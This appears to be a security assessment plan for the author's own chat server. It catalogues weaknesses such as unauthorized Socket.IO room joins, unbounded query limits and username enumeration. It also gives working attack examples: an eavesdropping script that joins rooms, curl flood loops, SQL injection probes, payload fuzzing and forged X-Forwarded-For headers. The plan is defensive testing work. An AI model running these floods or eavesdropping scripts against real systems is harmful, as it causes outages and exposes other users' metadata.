# aclient (Attack Client) – Assessment Plan

Purpose: plan a self‑hosted web client that mimics the existing React client but adds tooling to probe and validate security weaknesses in the SecureDove API/server. This document catalogs findings from reviewing this repo and outlines attack modules and controls for the future aclient. Do not implement yet.

## Scope and Setup
- Target: externally hosted instance of the server in this repo (Express + SQLite + Socket.IO).
- aclient runs locally in a browser, with an optional local proxy assist for tests that require custom headers (Origin/X‑Forwarded‑For) that browsers cannot set.
- User supplies base URL (scheme/host/port) and chooses attack modules to run.

## Key Observations and Likely Weaknesses
1) Socket.IO room join lacks authorization
   - Code: `server/server.js:122` joins any `conversation:{id}` if the socket is authenticated, without checking membership.
   - Impact: Any authenticated user can subscribe to metadata for arbitrary conversation IDs (sender username, timestamps, content key numbers) for future events. Payloads remain encrypted but metadata leaks; also enables resource exhaustion by joining many rooms.
   - Events exposed: `new-message`, `message-updated`, `message-deleted` (see `server/routes/messages.js:165`, `:226`).

2) Rate limiting behind a proxy is misconfigured by default
   - Global limiter on `/api` (`server/server.js:80`) with errors logged: `ERR_ERL_UNEXPECTED_X_FORWARDED_FOR` when X‑Forwarded‑For is present and `trust proxy` is false.
   - Risk: IP identification may be incorrect or unstable; depending on express‑rate‑limit behavior, clients may bypass or overly collide limits. Cloudflared and other proxies set XFF.
   - Evidence: runtime logs included in your session show this validation error.

3) Unbounded query parameters enable heavy responses
   - GET messages: `/api/messages/:conversationId?limit=…` has no maximum (default 50), `server/routes/messages.js:116`.
   - Recent messages: `/api/messages/recent/all?limit=…` has no maximum (default 20), `server/routes/messages.js:241`.
   - Impact: Large limits can force big DB reads and JSON responses (DoS vector for CPU/memory/bandwidth).

4) Large request bodies permitted
   - Body limit is `10mb` (`server/server.js:78`). Encrypted message payloads (`encrypted_msg_content`) are not size‑checked beyond this.
   - Impact: Flooding many near‑limit messages can bloat DB and I/O; CPU cost is incurred on emit and client decryption attempts.

5) CPU‑intensive bcrypt usage can be abused
   - SALT_ROUNDS=12 (`server/utils/auth.js:4`). Registration hashes and login verifications are intentionally expensive.
   - Impact: High‑rate login/register attempts can consume CPU (mitigated by rate limit—see weakness 2 for bypass risks via proxies).

6) Username enumeration endpoints
   - `GET /api/auth/check-username/:username` returns `exists` (`server/routes/auth.js:143`), and `POST /api/contacts` reports 404 for unknown contacts.
   - Impact: Facilitates account discovery; combine with rate‑limit issues.

7) Real‑time connection/room flood
   - No rate limiting on Socket.IO connections or room joins; an authenticated client can open many connections or join many rooms (`server/server.js:108`, `:122`).
   - Impact: Memory/cpu pressure on the gateway and adapter.

8) JWT secret quality risk
   - .env example uses a dev secret (`server/.env:6`). If unchanged in production, tokens can be forged.

9) SQL injection
   - Queries consistently use parameter binding (`server/config/database.js:24` helpers). Dynamic `IN (…)` lists also use bound placeholders. Direct SQLi is unlikely, but we will still verify.

10) XSS/script injection
   - Message rendering uses React text nodes (escaped). `client/src/components/Chat/Message.jsx:16` shows no dangerouslySetInnerHTML. Broadcast text is derived and also rendered as text.
   - Risk is low; CSS backgroundImage uses avatarUrl (`Message.jsx:9`), but avatarUrl is not attacker‑controlled in the current flow.

## Attack Modules (Design Outline)
The aclient UI exposes modules; each can be run individually or as a scenario. All actions will authenticate using either a newly registered test user or provided token.

1) Realtime Eavesdrop & Room Flood
   - Inputs: token; join range (start/end conversationId), join rate, max concurrent rooms.
   - Actions:
     - Connect to Socket.IO and authenticate.
     - Join arbitrary `conversation:{id}` rooms without membership.
     - Log events (id, sender_username, timestamps, content_key_number) to show metadata leakage.
     - Optionally brute‑force plausible id windows (Date.now() ranges) to detect active rooms.
     - Stress test: join N thousands of rooms and/or open M concurrent sockets.
   - Expected outcomes: Observe metadata for other conversations; gateway resource growth.

2) API Flood & Bounds Testing
   - Controls: concurrency, duration, body size (KB → near 10MB), query limit values, randomized endpoints.
   - Actions:
     - Login/register loops to exercise bcrypt CPU.
     - Send message floods (near 10MB payloads) to own conversation to grow DB.
     - GET messages with very large `limit` to force heavy reads.
   - Variants:
     - With and without Cloudflared; in Proxy‑Assist mode, attach forged X‑Forwarded‑For to probe rate‑limit behavior (browser cannot set this header directly).

3) SQL Injection Prober (Expect “safe”)
   - Targets: username path params, messageId/conversationId params, `limit` query.
   - Payloads: quotes, UNION probes, comment tails; confirm parameterization by verifying no effect, consistent errors, and no leakage.
   - Outcome: Documented as non‑exploitable if tests align with code review.

4) Message Payload Fuzzer (UTF‑8/format anomalies)
   - Controls: hex validity (odd length, non‑hex), truncated/oversized GCM frames, random bytes, huge JSON strings post‑decrypt (requires valid key).
   - Actions:
     - Update existing message via PUT with malformed `encrypted_msg_content`.
     - Send messages with extreme plaintext sizes (valid encryption) to test client resource limits.
   - Expected: Server stores; recipients fail decryption gracefully (caught in `client/src/context/MessagesContext.jsx:115,127`). Crash unlikely; resource stress possible with huge valid payloads.

5) Key Rotation/Participation Stress
   - Use `POST /api/conversations/:id/participants` with `share_history=false` to rotate keys repeatedly.
   - Requires providing re‑wrapped keys for all current participants; aclient will auto‑fetch participants, re‑wrap a new AES key, and submit.
   - Goal: Inflate `conversations` rows (per participant per rotation) and generate broadcast message storms.

6) Username Enumeration
   - Sweep `GET /api/auth/check-username/:username` and `POST /api/contacts` to build a directory of valid accounts.

## Optional Proxy‑Assist Mode (Node helper)
Some tests require headers the browser cannot set (e.g., X‑Forwarded‑For, custom Origin). A tiny local Node proxy can:
- Accept aclient requests and forward to the target with injected headers.
- Enable CORS bypass by sharing origin with aclient.
- Be toggleable; the core aclient remains a browser SPA.

## UI/Controls (High‑Level)
- Connect panel: base URL (https), optional WebSocket URL, auth token, register/login helpers.
- Realtime module: room join controls, ranges, connection count, event log and export.
- Flood module: concurrency, request rate, body size slider, endpoint checklist, duration, abort.
- Fuzzer: construct/edit messages by id; presets for malformed hex/GCM; generate large valid encrypted payloads (requires RSA content key access within own conversation).
- Rotation module: pick conversation; auto‑wrap new key for participants; rotation count/interval.
- Enumeration: username wordlist and results.
- Reporting: per‑module metrics (error rates, timings), CSV/JSON export.

## Ethics and Safety
- Use only against environments you are authorized to test.
- Keep payload sizes and rates within mutually agreed test budgets.
- Clearly label metadata‑only access vs. plaintext access; no attempt is made to break crypto.

## References (code anchors)
- Socket join without authz: `server/server.js:122`
- Message event emits: `server/routes/messages.js:165`, `server/routes/messages.js:226`
- Rate limiter placement: `server/server.js:80`; validation error context from runtime logs
- Body size limits: `server/server.js:78`
- Unbounded limits: `server/routes/messages.js:116`, `server/routes/messages.js:241`
- Bcrypt cost: `server/utils/auth.js:4`
- Username enumeration: `server/routes/auth.js:143`, `server/routes/contacts.js:19`
- Client decryption error handling: `client/src/context/MessagesContext.jsx:115`, `:127`
- Message rendering escapes text: `client/src/components/Chat/Message.jsx:16`

## Expected Findings Summary
- Metadata leakage and potential DoS via unauthorized Socket.IO room joins.
- DoS vectors via API floods (bcrypt, large payloads, large limits) and WebSocket floods.
- SQL injection likely not exploitable (parameterized queries), but tests included to validate.
- XSS likely not exploitable through message content; document negative results.

## UML Reference
Detailed PlantUML documentation lives under `documentation/puml/` and mirrors the use cases and examples above. Render them with the PlantUML CLI or any compatible viewer:

- `aclient-usecase.puml` – top-level actors and assessments
- `aclient-class.puml` – module/component structure
- `aclient-sequence-*.puml` – per-assessment sequences (Realtime, API Flood, SQL Probe, Payload Fuzzer, Key Rotation, Enumeration)
- `aclient-object.puml` – snapshot of a configured session
- `aclient-component.puml` – SPA/component relationships
- `aclient-deployment.puml` – deployment context with optional proxy assist
- `aclient-activity-runner.puml`, `aclient-state.puml` – lifecycle and state handling

Each diagram references the concrete request/response examples documented above so the visual model stays aligned with practical execution steps.

## Module Examples (Requests/Responses)

The examples below assume you have a bearer token in `TOKEN` and, where needed, a known conversation id in `CONV_ID`. Replace `https://target.example.com` with your origin base URL. All JSON bodies must use `Content-Type: application/json`.

### 0) Authentication helper

Login to obtain a token (existing test account):

```bash
curl -sS -X POST \
  'https://target.example.com/api/auth/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"tester","password":"P@ssw0rd!"}'
```

Sample response:

```json
{
  "message": "Login successful",
  "user": {
    "id": 3,
    "username": "tester",
    "public_key": "...hex...",
    "salt": "...hex...",
    "encrypted_private_key": "...hex..."
  },
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

Export token for subsequent calls:

```bash
export TOKEN='eyJhbGciOi...'
```

List conversations (for a valid `CONV_ID`):

```bash
curl -sS -H "Authorization: Bearer $TOKEN" \
  'https://target.example.com/api/conversations'
```

---

### 1) Realtime Eavesdrop & Room Flood

Join a conversation room without membership (Socket.IO). Note: this demonstrates metadata exposure, not plaintext.

```js
// Save as join-room.js and run with: node join-room.js
import { io } from 'socket.io-client';

const SOCKET_URL = 'https://target.example.com';
const TOKEN = process.env.TOKEN; // export TOKEN=...
const CONV_ID = Number(process.env.CONV_ID || '1698700000000');

const socket = io(SOCKET_URL, { transports: ['websocket'], rejectUnauthorized: false });

socket.on('connect', () => {
  console.log('connected', socket.id);
  socket.emit('authenticate', TOKEN);
  socket.emit('join-conversation', CONV_ID);
});

['new-message','message-updated','message-deleted'].forEach(evt => {
  socket.on(evt, (payload) => {
    // Metadata - note sender_username, content_key_number, timestamps
    console.log(`[${evt}]`, payload);
  });
});
```

Expected behavior: server accepts `join-conversation` regardless of membership (`server/server.js:122`), and future events for that `CONV_ID` will be delivered with metadata fields (IDs, timestamps, sender_username).

Room flood (many rooms): set `CONV_ID_START`, `CONV_ID_END` and iterate `join-conversation` to stress memory.

---

### 2) API Flood & Bounds Testing

2.a) Login CPU load (bcrypt):

```bash
seq 1 100 | xargs -I{} -P 8 curl -sS -X POST \
  'https://target.example.com/api/auth/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"tester","password":"P@ssw0rd!"}' >/dev/null
```

2.b) Large message payloads (near 10MB body limit):

Generate ~1 MiB of hex (scale N for larger tests):

```bash
HEX=$(python3 - <<'PY'
N = 1024*1024  # bytes
print('00'*N)
PY
)

curl -sS -X POST 'https://target.example.com/api/messages' \
  -H 'Authorization: Bearer '"$TOKEN" \
  -H 'Content-Type: application/json' \
  --data-binary @- <<JSON
{
  "conversation_id": ${CONV_ID},
  "content_key_number": 1,
  "encrypted_msg_content": "${HEX}"
}
JSON
```

Sample response:

```json
{
  "message": "Message sent successfully",
  "messageData": {
    "id": 1234,
    "conversation_id": 1698700000000,
    "content_key_number": 1,
    "sender_username": "tester",
    "created_at": 1730000000000,
    "is_deleted": 0
  }
}
```

2.c) Unbounded list retrieval (force heavy reads):

```bash
curl -sS -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/messages/${CONV_ID}?limit=1000000"
```

Expected: 200 OK with a very large JSON array unless the server enforces a max. This can be used to measure resource behavior.

---

### 3) SQL Injection Prober

Path parameter injection attempts should be neutralized by parameter binding.

3.a) Conversation messages with injected id:

```bash
curl -sS -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/messages/1%20OR%201=1"
```

Typical result:

```json
{ "error": "Access denied to this conversation" }
```

3.b) Public key lookup with SQL-ish username:

```bash
curl -sS -H "Authorization: Bearer $TOKEN" \
  'https://target.example.com/api/contacts/bob%27%20OR%201%3D1/public-key'
``;

Typical result:

```json
{ "error": "User not found" }
```

Conclusion: direct SQLi is unlikely; retain tests to confirm in deployment.

---

### 4) Message Payload Fuzzer (UTF‑8/format anomalies)

4.a) Non‑hex content:

```bash
curl -sS -X POST 'https://target.example.com/api/messages' \
  -H 'Authorization: Bearer '"$TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"conversation_id":'"${CONV_ID}"',"content_key_number":1,"encrypted_msg_content":"ZZZ-not-hex"}'
```

Expected server response: 201 Created (server stores opaque text). On clients, decryption attempts will fail; code paths in `MessagesContext` catch and ignore failures.

4.b) Odd‑length hex (invalid):

```bash
curl -sS -X POST 'https://target.example.com/api/messages' \
  -H 'Authorization: Bearer '"$TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"conversation_id":'"${CONV_ID}"',"content_key_number":1,"encrypted_msg_content":"0abcde"}'
```

4.c) Oversized but valid payloads: use the generator from 2.b and increase N.

---

### 5) Key Rotation/Participation Stress

Rotate to a new content key number (requires providing wrapped keys for all participants):

```bash
curl -sS -X POST "https://target.example.com/api/conversations/${CONV_ID}/participants" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-binary @- <<JSON
{
  "share_history": false,
  "content_key_number": 2,
  "entries": [
    { "username": "tester", "encrypted_content_key": "<wrapped_for_tester>" },
    { "username": "ally",   "encrypted_content_key": "<wrapped_for_ally>" }
  ],
  "system_broadcast": {
    "content_key_number": 2,
    "encrypted_msg_content": "<valid_or_placeholder_hex>"
  }
}
JSON
```

Sample response:

```json
{
  "message": "Conversation key rotated",
  "share_history": false,
  "content_key_number": 2,
  "participants": ["tester","ally"]
}
```

Expected: server accepts and emits system events; repeated rotations create many rows and realtime broadcasts.

---

### 6) Username Enumeration

Simple existence probe:

```bash
curl -sS 'https://target.example.com/api/auth/check-username/alice'
```

Response:

```json
{ "exists": true }
```

Contacts‑based probe:

```bash
curl -sS -X POST 'https://target.example.com/api/contacts' \
  -H 'Authorization: Bearer '"$TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"contact_username":"alice"}'
```

If unknown, typical response:

```json
{ "error": "User not found" }
```

---

### Proxy‑Assist Examples (optional)

Some behaviors (e.g., rate‑limit IP detection) only appear when a proxy injects `X-Forwarded-For`.

With curl (server configured to trust proxy):

```bash
curl -sS -H 'X-Forwarded-For: 203.0.113.9' \
  -H 'Authorization: Bearer '"$TOKEN" \
  'https://target.example.com/api/messages/'"${CONV_ID}"
```

With a tiny Node proxy, you can forward requests while injecting headers and reusing browser cookies to simulate real clients.
